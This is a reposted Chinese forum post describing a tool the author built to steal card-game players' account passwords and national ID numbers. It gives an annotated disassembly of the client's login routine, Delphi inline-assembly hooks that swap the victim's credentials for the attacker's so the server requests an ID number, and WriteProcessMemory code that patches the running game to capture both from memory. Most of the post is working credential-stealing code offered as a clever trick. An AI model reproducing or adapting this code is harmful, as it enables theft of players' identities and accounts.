@@ -1,0 +1,279 @@
+
+# 巧妙截取棋牌游戏中玩家身份证+密码
+
+> 原文：[`www.pediy.com/kssd/pediy12/142790.html`](https://www.pediy.com/kssd/pediy12/142790.html)
+
+闲着没事，前段时间帮人写一款截取玩家身份证的软件。。。。。感觉自己的思路还不错所以就分享给大家，![](img/755d44573ea0045d4eb19f2164c82d4e.jpg "扮鬼脸")
+
+一般棋牌游戏大家都知道注册是需要身份证，在这这台电脑第一次登陆是需要输入身份证，如果下次再登陆就不用身份证了。。我想主要是因为当第一次登陆的时候服务器记录上传登陆的信息和当前电脑的信息不一样，所以需要用户输入身份证进行验证。。然而如果他一直就再这台电脑上登陆，然而我又想获取他输入过的身份证怎么办呢？方法应该挺多的，但是我想很多人都想通过修改电脑信息进行让服务器验证发现这次登陆的信息和上次登陆不一样，而大多数人也许是该 `mac` 吧，但是这样会让当前网络中断。。而且要从新连接才生效。。。所以这样的操作办法很麻烦
+
+办法是人想出来的嘛，，于是我想到一个办法。大体思路是这样的，当用户登陆的时候，他登陆的是他的账号密码，然而你在登陆的那个地方进行拦截修改成你自己的账号和密码，那么服务器接受的是你的账号和密码，然而你的电脑肯定没在这个电脑成功登陆过，服务器必定返回命令要求你输入身份证号码。。。。这样你在内存中再拦截他输入的身份证号码，这样不就达到目的了吗？
+
+what a clever boy!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ![](img/906f120cfe711ccbc8463fd6eb86eee9.jpg "尴尬")
+
+下面用一个简单的代码进行详细说明
+
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
+
+```
+0048005D  > \8B95 6CEAFFFF mov edx,dword ptr ss:\[ebp-0x1594\]
+00480063  . 52           push edx
+00480064  . 68 983A0000  push 0x3A98
+00480069  . 8B85 6CEAFFFF mov eax,dword ptr ss:\[ebp-0x1594\]
+0048006F  . 8B48 20      mov ecx,dword ptr ds:\[eax+0x20\]
+00480072  . 51           push ecx     // dd \[ecx\]=密码
+00480073  . 8B95 70EAFFFF mov edx,dword ptr ss:\[ebp-0x1590\]
+00480079  . 52           push edx     // dd \[edx\]= 账号
+0048007A  . 8B85 68EAFFFF mov eax,dword ptr ss:\[ebp-0x1598\]
+00480080  . 50           push eax     // eax=1 用户 id 登陆  eax=2 用户名登陆
+00480081  . 8B8D 648EFFFF mov ecx,dword ptr ss:\[ebp-0x719C\]
+00480087  . 83C1 04      add ecx,0x4
+0048008A  . E8 81C70100  call Lobby.0049C810 发送账号到服务器：验证账号是否存在
+0048008F  . 8945 F8      mov dword ptr ss:\[ebp-0x8\],eax
+00480092  . 837D F8 00   cmp dword ptr ss:\[ebp-0x8\],0x0  判断账号是否存在 ，等于 0 表示账号存在
+00480096  . 74 13        je short Lobby.004800AB
+00480098  . 8B8D 648EFFFF mov ecx,dword ptr ss:\[ebp-0x719C\]
+0048009E  . 83C1 04      add ecx,0x4
+004800A1  . E8 FAC70100  call Lobby.0049C8A0
+004800A6  . E9 5F020000  jmp Lobby.0048030A
+004800AB  > 6A 08        push 0x8                         ; /n = 8
+004800AD  . 6A 00        push 0x0                         ; |c = 00
+004800AF  . 8D8D 58EAFFFF lea ecx,dword ptr ss:\[ebp-0x15A8\]     ; |
+004800B5  . 51           push ecx                         ; |s
+004800B6  . E8 B1BE0200  call <jmp.&MSVCR71.memset>      ; \memset
+004800BB  . 83C4 0C      add esp,0xC
+004800BE  . 8D95 58EAFFFF lea edx,dword ptr ss:\[ebp-0x15A8\]
+004800C4  . 52           push edx
+004800C5  . 8B85 6CEAFFFF mov eax,dword ptr ss:\[ebp-0x1594\]
+004800CB  . 50           push eax
+004800CC  . 68 983A0000  push 0x3A98
+004800D1  . 8B8D 6CEAFFFF mov ecx,dword ptr ss:\[ebp-0x1594\]
+004800D7  . 8B51 20      mov edx,dword ptr ds:\[ecx+0x20\]
+004800DA  . 52           push edx     //密码
+004800DB  . 8B85 70EAFFFF mov eax,dword ptr ss:\[ebp-0x1590\]
+004800E1  . 50           push eax   //  账号、id
+004800E2  . 8B8D 68EAFFFF mov ecx,dword ptr ss:\[ebp-0x1598\]
+004800E8  . 51           push ecx  // ecx=1 用户 id 登陆 ecx=2 用户名登陆
+004800E9  . 8B8D 648EFFFF mov ecx,dword ptr ss:\[ebp-0x719C\]
+004800EF  . 83C1 04      add ecx,0x4
+004800F2  . E8 E9F00100  call Lobby.0049F1E0     验证账号+密码是否正确
+004800F7  . 8945 F8      mov dword ptr ss:\[ebp-0x8\],eax
+004800FA  . 837D F8 00   \[cmp dword ptr ss:\[ebp-0x8\],0x0  判断账号密码是否正确 ，等于 0 表示成功登陆
+004800FE  . 74 2E        je short Lobby.0048012E
+```
+
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
+
+我要拦截的地方就是上面 2 个向服务器发送消息的函数
+
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
+
+```
+var
+addr_mima:integer=0;//存放密码的地址
+id_addr_name：integer=0;//存放账号的内存地址  id
+addr_name：integer=0;//存放账号的内存地址 用户名
+kaguan:integer=0;//看是否获取身份证  是 0 的话就获取
+mi_ma:string='';//自己的密码
+zhang_hao：string='';//自己的账号
+```
+
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
+
+```
+function hook_mima():bool;
+asm
+mov eax,dword ptr ss:\[ebp-$1594\]
+mov ecx,dword ptr ds:\[eax+$20\]
+mov addr_mima,ecx
+cmp kaguan,0   开关 当为 0 的时候就获取身份证 就是发送自己的账号和密码
+jnz @@1
+lea ecx,mi_ma
+mov ecx,\[ecx\]
+mov \[ebp-$1598\],2
+@@1:
+push ecx  密码
+mov edx,dword ptr ss:\[ebp-$1590\]
+mov eax,\[ebp-$1598\]
+cmp eax,1     如果是 1 的话就是 id
+jnz @@3
+mov id_addr_name,edx
+jmp @@4
+@@3:
+mov addr_name,edx
+@@4:
+cmp kaguan,0
+jnz @@2
+lea edx,zhang_hao
+mov edx,\[edx\]
+@@2:
+push edx
+jmp jmp_lanj  跳回去继续执行
+end;
+end；
+```
+
+下面的同样的道理。。。。。当 `kaguan=0` 的时候便会写入我设置的账号和密码
+
+```
+function hook_mima2():bool;
+begin
+asm
+mov eax,dword ptr ss:\[ebp-$1594\]
+mov ecx,dword ptr ds:\[eax+$20\]
+mov addr_mima,ecx
+cmp kaguan,0
+jnz @@1
+lea ecx,mi_ma
+mov ecx,\[ecx\]
+mov \[ebp-$1598\],2  //用户名登陆
+@@1:
+push ecx  //密码
+mov edx,dword ptr ss:\[ebp-$1590\]
+mov eax,\[ebp-$1598\]
+cmp eax,1     ///如果是 1 的话就是 id
+jnz @@3
+mov id_addr1_name,edx
+jmp @@4
+@@3:
+mov addr1_name,edx
+@@4:
+cmp kaguan,0
+jnz @@2
+lea edx,zhang_hao
+mov edx,\[edx\]
+@@2:
+push edx
+jmp jmp_lanj1
+end;
+end;
+```
+
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
+
+通过上面的操作把 2 个函数在相应的位置进行 hook 如果当程序启动的时候，如果需要获取身份证的时候便把 `kaguan=0` else `kaguan=1;`
+
+而且将上面的密码+账号内存地址在适当的时候读取便可以获取用户的账号和密码
+
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*获取身份证号码\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
+
+```
+var
+sfz_hao:string='';//身份证号码
+function get_sfz():bool;
+begin
+//0042CCF8  |.  81C1 1C050000 add ecx,0x51C
+//0042CCFE  |.  51           push ecx                         ; /src   身份证
+//0042CCFF  |.  8B55 BC     mov edx,\[local.17\]               ; |
+//0042CD02  |.  81C2 3F050000 add edx,0x53F                    ; |
+//0042CD08  |.  52           push edx                         ; |dest
+//0042CD09  |.  E8 58F20700  call <jmp.&MSVCR71.strcpy>      ; \strcpy
+asm
+add ecx,$51c
+push eax
+push ecx
+mov ik,ecx
+lea eax,sfz_hao  把身份证号码写入到 sfz_hao 里面
+mov ecx,\[ecx\]
+mov \[eax\],ecx
+mov ecx,ik
+mov ecx,\[ecx+4\]
+mov \[eax+4\],ecx
+mov ecx,ik
+mov ecx,\[ecx+8\]
+mov \[eax+8\],ecx
+mov ecx,ik
+mov ecx,\[ecx+12\]
+mov \[eax+12\],ecx
+mov ecx,ik
+mov ecx,\[ecx+16\]
+mov \[eax+16\],ecx
+mov ecx,ik
+mov ecx,\[ecx+20\]
+mov \[eax+20\],ecx
+mov ecx,ik
+mov ecx,\[ecx+24\]
+mov \[eax+24\],ecx
+pop ecx
+pop eax
+mov addr_sfz,1
+push ecx
+mov kaguan,1  把开关关了。。。防止下次登录用户还需要是输入身份证
+jmp  \*\*\*\*\*\*
+end;
+end;
+```
+
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
+
+通过简答的几个函数便可以实现对密码 和 身份证的获取了。。。这种方法简单而且准确性高
+
+如果通过记录键盘那样的话可能误差相对大一点，而且身份证他是游戏设置的虚拟键盘所以不能通过键盘获取
+
+ 简单的几段代码就能够达到获取密码和身份证的目的。。![](img/755d44573ea0045d4eb19f2164c82d4e.jpg "扮鬼脸")
+
+下面是对程序进行 hook 的代码
+
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
+
+```
+procedure hookmima(h:hwnd);
+var
+lpNumberOfBytesWritten:dword;
+a1:integer;
+ee9:byte;
+pid: DWORD  ;
+phandle:hwnd;
+begin
+ee9:=$e9;
+asm
+push eax
+lea eax,hook_mima
+mov a1,eax
+pop eax
+end;
+a1:=a1-$00480069-5+1;
+GetWindowThreadProcessId(h,@pid);
+phandle:=OpenProcess(PROCESS_ALL_ACCESS,false,pid);
+writeProcessMemory(pHandle,Pointer($00480069),@ee9,sizeof(ee9),lpNumberOfBytesWritten);
+writeProcessMemory(pHandle,Pointer($00480069+1),@a1,sizeof(a1),lpNumberOfBytesWritten);
+asm
+push eax
+lea eax,hook_mima2
+mov a1,eax
+pop eax
+end;
+```
+
+
+
+`a1:=a1-$004800D1-5+1;`
+
+`writeProcessMemory(pHandle,Pointer($004800D1),@ee9,sizeof(ee9),lpNumberOfBytesWritten);`
+
+`writeProcessMemory(pHandle,Pointer($004800D1+1),@a1,sizeof(a1),lpNumberOfBytesWritten);`
+
+```
+asm
+push eax
+lea eax,get_sfz
+mov a1,eax
+pop eax
+end;
+```
+
+`a1:=a1-$0042CCF8-5;`
+
+`writeProcessMemory(pHandle,Pointer($0042CCF8),@ee9,sizeof(ee9),lpNumberOfBytesWritten);`
+
+`writeProcessMemory(pHandle,Pointer($0042CCF8+1),@a1,sizeof(a1),lpNumberOfBytesWritten);`
+
+```
+end;
+```
+
+\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
+
+里面没什么技术含量，而且汇编很粗糙。。。。。。但是我想阐述的就是一个思路
+
+这篇帖也就到此结束了。。。。。。。。。。。。。。。。。。。。。。。。。。。
